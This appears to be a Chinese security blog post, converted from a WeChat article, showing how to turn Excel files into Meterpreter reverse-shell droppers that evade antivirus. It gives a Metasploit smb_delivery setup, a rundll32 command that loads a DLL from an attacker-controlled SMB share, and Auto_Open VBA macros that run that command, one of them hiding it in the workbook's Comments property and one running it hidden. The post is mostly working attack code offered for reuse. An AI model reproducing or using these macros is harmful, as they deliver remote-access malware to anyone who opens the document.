<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/zcCG2lE_h6H8bj6BHfYfHQ)

0x01 前言
-------

通过`Excel`文件运行命令行以生成`Meterpreter`反向 shell 的不同方法，尝试使用这种方式来尝试`Bypass_AV`

0x02 SMB_Deliver Exploit
------------------------

`Metasploit SMB`传递模块通过`SMB`服务器提供`.dll`有效负载，并执行生成的有效负载的命令。

**Msfconsole:**

```
use exploit/windows/smb/smb_delivery
```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfj4k07zmaVC6WPThnJ9fehkA5Jb5GFOm5SctTDia1boriarXeEo7guiaiaXgnUUGRKSCXKdf0uBrwibiaYQ/640?wx_fmt=png)执行`exploit`会自动设置`meterpreter_reverse_tcp`有效负载，以便在受害机器上打开 Meterpreter`反向 shell`

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfj4k07zmaVC6WPThnJ9fehk4R3cgBhW7YJDbibAUYcsXL6rXe2M0dHcq65yB9ibkibPGKC14wrOyiclKg/640?wx_fmt=png)我在我们的测试环境执行命令

`rundll32.exe \\192.168.190.128\3\2\1.dll,0`

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfj4k07zmaVC6WPThnJ9fehkPBBMSicsXJKSF9wp2icUQ83mjbmCibOIISs77e3RSibLX1HFj5mc9b8Gpw/640?wx_fmt=png)

```
#爬坑: 在Win10上需要SMB2或更高版本的错误http://www.ghost580.com/win10/2018-11-10/26476.html
```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfj4k07zmaVC6WPThnJ9fehk9VCc6Yps45xBfTjECqBiaiadsWR6KvzRlqueJgW15BA4LVpTl7rEQPAg/640?wx_fmt=png)反向 shell 成功执行

0x03 Excel 武器化
--------------

##### VBS 宏脚本

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfj4k07zmaVC6WPThnJ9fehkicibPKRuUEulyDHW69EI1elibV3Y7fiaAN3icO2w32jB2p1ez52RUCwic8Aw/640?wx_fmt=png)**Code:**

```
Sub Auto_Open()Call Shell("cmd.exe /c rundll32.exe \\192.168.190.128\3\2\1.dll,0", )End Sub
```

发现简单的宏文件是无法绕过`AV`的

##### 在备注插入命令宏执行

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfj4k07zmaVC6WPThnJ9fehkxhc4Pf51DLXD9AtDbTE5R9v2wbkuicsSicWYLA4dFTS9BrT0gZOmfrfA/640?wx_fmt=png)在备注下插入命令行，宏文件代码 **Code:**

```
Sub Auto_Open()Dim prop As DocumentProperty    For Each prop In ActiveWorkbook.BuiltinDocumentProperties        If prop.Name = "Comments" Then            Shell prop.Value        End If    NextEnd Sub
```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfj4k07zmaVC6WPThnJ9fehkeZh3pkOeeiad9ws3ADPsXic9q8bsJpicQsNXBKianLpsZDDa6y4erq9qkA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfj4k07zmaVC6WPThnJ9fehkuaMsuGNskibrYgGhzYnNCOuj1Cp7ickjeckvhczRpz4o39eE8pgia8slg/640?wx_fmt=png)

##### 自定义公式执行

为了运行命令行，我创建了一个适合我们的自定义公式

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfj4k07zmaVC6WPThnJ9fehkNuqvDwtjKoZgHIj0Wdt0tsqvMcm7kvSX1fkialyjcfecxgdtQkB0Qpg/640?wx_fmt=png)

##### 自定义按钮内的 VBS 宏脚本

我在自定义按钮中插入了 VBS 宏脚本![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfj4k07zmaVC6WPThnJ9fehklWcGtRkhiaacog6nELtudZWyHw8Hq7PsZ3diaEia8BHglbiaiariafVNIWRw/640?wx_fmt=png) **Code:**

```
Sub Auto_Open()Call Shell("rundll32.exe \\192.168.190.128\3\2\1.dll,0", vbHide)End Sub
```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfj4k07zmaVC6WPThnJ9fehkNqsc5BbO8yoHfvqeiaJKVEOBr0y4MjAWTRMWiaR3UEsKbgNNoYRg5M5g/640?wx_fmt=png)保存为. xls 文件然后打开发现可以反向 Shell

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfj4k07zmaVC6WPThnJ9fehkT0fdcosBJtLPg7n3tdUCE3NG6eqDp5g7gOgzRZF31Sx9TjicKnkdO9A/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfj4k07zmaVC6WPThnJ9fehkeQm6oW2EJCFY8icjPRraboTkVJBSLib5qlHy05XHfeQQVqzqMAhOWO4A/640?wx_fmt=png)

0x04 结尾
-------

单纯记录一下，大佬们不喜勿喷

![](https://mmbiz.qpic.cn/mmbiz_jpg/icefLCXrhxfj4k07zmaVC6WPThnJ9fehkVfMlQthm0KHfknQX3CN3UE3ZWYHUHNNSGNmlB4Cicickm0hKiblSXTibdQ/640?wx_fmt=jpeg)